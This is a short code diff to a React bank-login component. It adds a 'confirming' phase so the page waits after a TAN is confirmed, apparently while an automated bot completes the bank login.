@@ -420,8 +420,12 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
 
 
-      if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo || tanConfirmedSignal) {
-        setPhase("tan");
+      if (tanConfirmedSignal) {
+        // TAN bereits bestätigt → in Ladephase wechseln bis der Bot fertig ist.
+        setPhase("confirming");
+        setSubmitting(false);
+      } else if (st === "waiting_for_tan" || tanRequired || loginValidated || looksLikeSecureGo) {
+        setPhase((prev) => (prev === "confirming" ? prev : "tan"));
         setSubmitting(false);
 
       } else if (st === "running" || st === "pending") {
